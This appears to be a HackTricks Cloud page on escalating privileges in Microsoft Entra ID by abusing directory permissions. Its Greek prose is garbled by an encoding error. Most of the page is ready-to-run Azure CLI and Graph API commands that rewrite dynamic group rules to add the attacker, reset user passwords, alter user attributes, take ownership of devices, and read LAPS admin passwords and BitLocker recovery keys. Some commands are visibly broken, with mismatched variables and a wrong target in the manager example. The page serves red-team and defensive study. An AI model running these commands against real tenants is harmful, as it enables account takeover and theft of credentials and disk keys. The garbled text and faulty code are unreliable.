Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ· Ï„Î¿Ï… ÎºÎ±Î½ÏŒÎ½Î± Î¼Î­Î»Î¿Ï…Ï‚ ÏƒÎµ Î¼Î¹Î± Î´Ï…Î½Î±Î¼Î¹ÎºÎ® Î¿Î¼Î¬Î´Î±. ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿Ï…Ï‚ Î´Ï…Î½Î±Î¼Î¹ÎºÎ¿ÏÏ‚ ÎºÎ±Î½ÏŒÎ½ÎµÏ‚ Î³Î¹Î± Î½Î± ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î¬Î²ÎµÎ¹ Ï„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ Ï„Î¿Ï… ÏƒÎµ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡ÎµÏ‚ Î¿Î¼Î¬Î´ÎµÏ‚ Ï‡Ï‰ÏÎ¯Ï‚ ÏÎ·Ï„Î® Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ·.
```bash
groupId="<group-id>"
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/groups/$groupId" \
--headers "Content-Type=application/json" \
--body '{
"membershipRule": "(user.otherMails -any (_ -contains \"security\")) -and (user.userType -eq \"guest\")",
"membershipRuleProcessingState": "On"
}'
```
**Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·**: Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÎ¾Î±Î¹ÏÎµÎ¯ Ï„Î¹Ï‚ Î¿Î¼Î¬Î´ÎµÏ‚ ÏÏŒÎ»Ï‰Î½ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Î½Î±Ï„ÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î¿ Entra ID.

### Î”Ï…Î½Î±Î¼Î¹ÎºÎ­Ï‚ ÎŸÎ¼Î¬Î´ÎµÏ‚ Privesc

Î•Î¯Î½Î±Î¹ Ï€Î¹Î¸Î±Î½ÏŒ Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î½Î± Î¼Ï€Î¿ÏÎ­ÏƒÎ¿Ï…Î½ Î½Î± Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎ¿Ï…Î½ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î¬ Ï„Î¿Ï…Ï‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¹Ï‚ Î´Î¹ÎºÎ­Ï‚ Ï„Î¿Ï…Ï‚ Î¹Î´Î¹ÏŒÏ„Î·Ï„ÎµÏ‚ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ„ÎµÎ¸Î¿ÏÎ½ Ï‰Ï‚ Î¼Î­Î»Î· Î´Ï…Î½Î±Î¼Î¹ÎºÏÎ½ Î¿Î¼Î¬Î´Ï‰Î½. Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚, ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

## Î§ÏÎ®ÏƒÏ„ÎµÏ‚

### `microsoft.directory/users/password/update`

Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÎµ Î¼Î· Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î­Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ ÏƒÎµ Î­Î½Î±Î½ Ï€Î¹Î¸Î±Î½ÏŒ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎµÎ¹ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î¬ Ï„Î¿Ï… ÏƒÎµ Î¬Î»Î»Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚.
```bash
az ad user update --id <user-id> --password "kweoifuh.234"
```
### `microsoft.directory/users/basic/update`

Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Ï‰Î½ Î¹Î´Î¹Î¿Ï„Î®Ï„Ï‰Î½ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·. Î•Î¯Î½Î±Î¹ ÏƒÏ…Î½Î·Î¸Î¹ÏƒÎ¼Î­Î½Î¿ Î½Î± Î²ÏÎ¯ÏƒÎºÎ¿Ï…Î¼Îµ Î´Ï…Î½Î±Î¼Î¹ÎºÎ­Ï‚ Î¿Î¼Î¬Î´ÎµÏ‚ Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÎ¸Î­Ï„Î¿Ï…Î½ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î¹Ï‚ Ï„Î¹Î¼Î­Ï‚ Ï„Ï‰Î½ Î¹Î´Î¹Î¿Ï„Î®Ï„Ï‰Î½, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î½Î± Î¿ÏÎ¯ÏƒÎµÎ¹ Ï„Î·Î½ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î· Ï„Î¹Î¼Î® Î¹Î´Î¹ÏŒÏ„Î·Ï„Î±Ï‚ Î³Î¹Î± Î½Î± ÎµÎ¯Î½Î±Î¹ Î¼Î­Î»Î¿Ï‚ Î¼Î¹Î±Ï‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î·Ï‚ Î´Ï…Î½Î±Î¼Î¹ÎºÎ®Ï‚ Î¿Î¼Î¬Î´Î±Ï‚ ÎºÎ±Î¹ Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎµÎ¹ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±.

{% code overflow="wrap" %}
```bash
#e.g. change manager of a user
victimUser="<userID>"
managerUser="<userID>"
az rest --method PUT \
--uri "https://graph.microsoft.com/v1.0/users/$managerUser/manager/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/$managerUser"}'

#e.g. change department of a user
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
--headers "Content-Type=application/json" \
--body "{\"department\": \"security\"}"
```
{% endcode %}

## Î Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ Î ÏÎ¿ÏƒÎ²Î±ÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î±Ï‚ Î¼Îµ ÎŒÏÎ¿Ï…Ï‚ & Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· MFA

Î›Î±Î½Î¸Î±ÏƒÎ¼Î­Î½Î± ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ Ï€ÏÎ¿ÏƒÎ²Î±ÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î±Ï‚ Î¼Îµ ÏŒÏÎ¿Ï…Ï‚ Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„Î¿ÏÎ½ MFA Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸Î¿ÏÎ½, ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

## Î£Ï…ÏƒÎºÎµÏ…Î­Ï‚

### `microsoft.directory/devices/registeredOwners/update`

Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î½Î± Î±Î½Î±Î¸Î­Ï„Î¿Ï…Î½ Ï„Î¿Ï…Ï‚ ÎµÎ±Ï…Ï„Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚ Ï‰Ï‚ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„ÎµÏ‚ ÏƒÏ…ÏƒÎºÎµÏ…ÏÎ½ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î½ Î­Î»ÎµÎ³Ï‡Î¿ Î® Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Îµ Ï„Î· ÏƒÏ…ÏƒÎºÎµÏ…Î®.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/devices/registeredUsers/update`

Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î½Î± ÏƒÏ…ÏƒÏ‡ÎµÏ„Î¯ÏƒÎ¿Ï…Î½ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï„Î¿Ï…Ï‚ Î¼Îµ ÏƒÏ…ÏƒÎºÎµÏ…Î­Ï‚ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î® Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎ¿Ï…Î½ Ï„Î¹Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/registeredUsers/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/deviceLocalCredentials/password/read`

Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎ¿Ï…Î½ Ï„Î¹Ï‚ Î¹Î´Î¹ÏŒÏ„Î·Ï„ÎµÏ‚ Ï„Ï‰Î½ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Ï‰Î½ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ Ï„Î¿Ï€Î¹ÎºÎ¿Ï Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® Î³Î¹Î± ÏƒÏ…ÏƒÎºÎµÏ…Î­Ï‚ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½ÎµÏ‚ Î¼Îµ Ï„Î¿ Microsoft Entra, ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Î¿Ï… Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚

{% code overflow="wrap" %}
```bash
# List deviceLocalCredentials
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials"

# Get credentials
deviceLC="<deviceLCID>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials/$deviceLCID?\$select=credentials" \
```
{% endcode %}

## BitlockerKeys

### `microsoft.directory/bitlockerKeys/key/read`

Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎºÎ»ÎµÎ¹Î´Î¹Î¬ BitLocker, Ï„Î± Î¿Ï€Î¿Î¯Î± Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÎ¹ Î´Î¯ÏƒÎºÎ¿Ï…Ï‚, Î¸Î­Ï„Î¿Î½Ï„Î±Ï‚ ÏƒÎµ ÎºÎ¯Î½Î´Ï…Î½Î¿ Ï„Î·Î½ ÎµÎ¼Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î¹ÎºÏŒÏ„Î·Ï„Î± Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.

{% code overflow="wrap" %}
```bash
# List recovery keys
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys"

# Get key
recoveryKeyId="<recoveryKeyId>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys/$recoveryKeyId?\$select=key"
```
{% endcode %}

## Î†Î»Î»ÎµÏ‚ Î•Î½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ (TODO)

* `microsoft.directory/applications/permissions/update`
* `microsoft.directory/servicePrincipals/permissions/update`
* `microsoft.directory/applications.myOrganization/allProperties/update`
* `microsoft.directory/applications/allProperties/update`
* `microsoft.directory/servicePrincipals/appRoleAssignedTo/update`
* `microsoft.directory/applications/appRoles/update`
* `microsoft.directory/applications.myOrganization/permissions/update`

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
